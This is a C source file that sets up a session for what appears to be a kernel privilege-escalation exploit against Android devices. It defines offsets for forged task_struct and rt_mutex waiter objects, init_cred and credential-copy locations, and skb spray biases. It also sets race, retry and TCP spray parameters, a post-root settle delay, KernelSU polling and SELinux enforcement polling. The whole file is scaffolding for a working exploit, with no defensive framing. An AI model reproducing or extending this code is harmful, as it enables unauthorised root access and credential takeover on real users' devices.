#include "../glk_session.h"

#include <assert.h>
#include <string.h>

void glk43499_layout_defaults(Glk43499Layout *l) {
  if (!l) return;
  memset(l, 0, sizeof(*l));
  l->kimage_text_base = KIMAGE_TEXT_BASE;
  l->mtk_vaddr_base = MTK_VADDR_BASE;
  l->xring_kernel_phys_load = XRING_KERNEL_PHYS_LOAD;
  l->qc_gki_6_12_phys_load = QC_GKI_6_12_PHYS_LOAD;
  l->p0_page_offset = P0_PAGE_OFFSET;
  l->p0_phys_offset = P0_PHYS_OFFSET;
  l->direct_map_base = DIRECT_MAP_BASE;
  l->direct_map_end = DIRECT_MAP_END;
  l->vmemmap_start = VMEMMAP_START;
  l->kernelsnitch_identity_start = KERNELSNITCH_IDENTITY_START;
  l->kernelsnitch_identity_end = KERNELSNITCH_IDENTITY_END;
  l->p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
  l->init_cred_image = KIMAGE_TEXT_BASE + INIT_CRED_OFF;
  l->page_shift = PAGE_SHIFT;
  l->page_size = PAGE_SIZE;
  l->lock_off = LOCK_OFF;
  l->w0_off = W0_OFF;
  l->fops_off = FOPS_OFF;
  l->right_off = RIGHT_OFF;
  l->left_off = LEFT_OFF;
  l->fake_task_off = FAKE_TASK_OFF;
  l->cred_copy_off = CRED_COPY_OFF;
  l->tcp_fake_task_off = TCP_FAKE_TASK_OFF;
  l->tcp_cred_copy_off = TCP_CRED_COPY_OFF;
  l->skb_data_delta = SKB_DATA_DELTA;
  l->skb_frag_bias = SKB_FRAG_BIAS;
  l->skb_tcp_bias = 0xe80;
  l->fake_waiter_tree_prio_off = FAKE_WAITER_TREE_PRIO_OFF;
  l->fake_waiter_tree_deadline_off = FAKE_WAITER_TREE_DEADLINE_OFF;
  l->fake_waiter_pi_tree_entry_off = FAKE_WAITER_PI_TREE_ENTRY_OFF;
  l->fake_waiter_pi_tree_prio_off = FAKE_WAITER_PI_TREE_PRIO_OFF;
  l->fake_waiter_pi_tree_deadline_off = FAKE_WAITER_PI_TREE_DEADLINE_OFF;
  l->fake_waiter_task_off = FAKE_WAITER_TASK_OFF;
  l->fake_waiter_lock_off = FAKE_WAITER_LOCK_OFF;
  l->fake_waiter_prio = FAKE_WAITER_PRIO;
  l->fake_waiter_wake_state_off = FAKE_WAITER_WAKE_STATE_OFF;
  l->fake_waiter_ww_ctx_off = FAKE_WAITER_WW_CTX_OFF;
  l->fake_task_usage_off = FAKE_TASK_USAGE_OFF;
  l->fake_task_prio_off = 0x94;
  l->fake_task_normal_prio_off = 0x9c;
  l->fake_task_task_group_off = 0x420;
  l->fake_task_pi_lock_off = 0x9ec;
  l->fake_task_pi_waiters_off = 0xa00;
  l->fake_task_pi_top_task_off = 0xa10;
  l->fake_task_pi_blocked_on_off = 0xa18;
  l->fake_task_prio = FAKE_TASK_PRIO;
  l->fake_task_uclamp_req_off = FAKE_TASK_UCLAMP_REQ_OFF;
  l->fake_task_uclamp_off = FAKE_TASK_UCLAMP_OFF;
  assert(l->fake_task_prio_off == 0x94);
}

void glk43499_config_defaults(Glk43499Config *c) {
  if (!c) return;
  c->select_nfds = 320;
  c->select_timeout_us = 200000;
  c->select_enter_delay_us = 50000;
  c->select_fast_repair_us = 5000;
  c->select_route_poll_us = 5000;
  c->select_consumer_nice = 19;
  c->select_consumer_burst_calls = 1;
  c->select_consumer_max_calls = 1;
  c->select_consumer_settle_us = 250000;
  c->pselect_drain_rounds = 2000;
  c->consumer_retry_wait_us = 50000;
  c->post_root_settle_sec = 2;
  c->tcp_attempts = 2000;
  c->tcp_arm_seq = 16;
  c->tcp_post_hold = 20000;
  c->tcp_punch_len = 16u * 1024u * 1024u;
  c->mm_order = MM_ORDER;
  c->mm_partials = MM_PARTIALS;
  c->skb_reclaim_sends = SKB_RECLAIM_SENDS;
  c->resident_5x = false;
  c->phase1_probe = false;
  c->tcp_route = true;
  c->w1_attempts = 15;
  c->w1_kernel5_attempts = 1;
  c->w1_settle_us = 100000;
  c->w1_scratch_repair_attempts = 3;
  c->w2_attempts = 15;
  c->w2_settle_us = 100000;
  c->w3_chain_rounds = 3;
  c->w3_attempts = 6;
  c->w3_settle_us = 50000;
  c->w3_backoff_us = 100000;
  c->w3_dir_attempts = 4;
  c->retry_write_backoff_us = 100000;
  c->retry_write_post_us = 50000;
  c->ksu_poll_us = 100000;
  c->ksu_log_wait_us = 500000;
  c->ksu_module_poll_rounds = 30;
  c->ksu_log_poll_rounds = 60;
  c->enforce_poll_rounds = 200;
  c->race_poll_us = 1000;
  c->slab_drain_us = 20000;
  c->enforce_wait_us = 100000;
  c->perf_sample_period = 5000;
  c->perf_buffer_pages = 32;
  c->perf_spin = 500000;
  c->perf_candidates = 256;
  c->page_attempts = 6;
  c->page_deadline_sec = 240;
  c->route_wait_seconds = 1;
  c->route_fast_wait_us = 20000;
}

void glk43499_target_init(Glk43499Target *dst,
                          const struct kernel_offsets *src,
                          const char *release) {
  if (!dst || !src) {
    return;
  }
  memset(dst, 0, sizeof(*dst));
  glk43499_layout_defaults(&dst->layout);
  dst->offsets = *src;
  if (release) {
    size_t n = strlen(release);
    if (n >= sizeof(dst->release)) {
      n = sizeof(dst->release) - 1;
    }
    memcpy(dst->release, release, n);
    dst->release[n] = '\0';
  }
  dst->offsets.uname_r = dst->release;
  dst->self = (uintptr_t)dst;
}

int glk43499_target_valid(const Glk43499Target *target) {
  return target && target->self == (uintptr_t)target &&
         target->offsets.uname_r == target->release;
}

static void runtime_init(Glk43499Runtime *rt) {
  rt->reclaim_sv[0] = -1;
  rt->reclaim_sv[1] = -1;
  rt->quarantined_reclaim_sv[0] = -1;
  rt->quarantined_reclaim_sv[1] = -1;
  rt->prebuilt_reclaim_sv[0] = -1;
  rt->prebuilt_reclaim_sv[1] = -1;
  rt->memfd_leak = -1;
  rt->mr_fd = -1;
}

int glk_session_create_43499(GlkSession *outer,
                             struct Glk43499Session *inner,
                             const Glk43499Target *target,
                             const Glk43499Config *config,
                             const Glk43499Env *env) {
  if (!outer || !inner || !target || !config || !env ||
      !glk43499_target_valid(target)) {
    return GLK_BAD_PARAM;
  }

  memset(inner, 0, sizeof(*inner));
  runtime_init(&inner->rt);
  glk43499_target_init(&inner->target, &target->offsets, target->release);
  inner->target.layout = target->layout;
  inner->config = *config;
  inner->env = *env;
  atomic_init(&inner->stopping, false);

  memset(outer, 0, sizeof(*outer));
  outer->backend = GLK_BACKEND_43499;
  outer->u.p43499 = inner;
  return GLK_OK;
}

void glk_session_destroy(GlkSession *outer) {
  if (!outer) {
    return;
  }
  memset(outer, 0, sizeof(*outer));
}
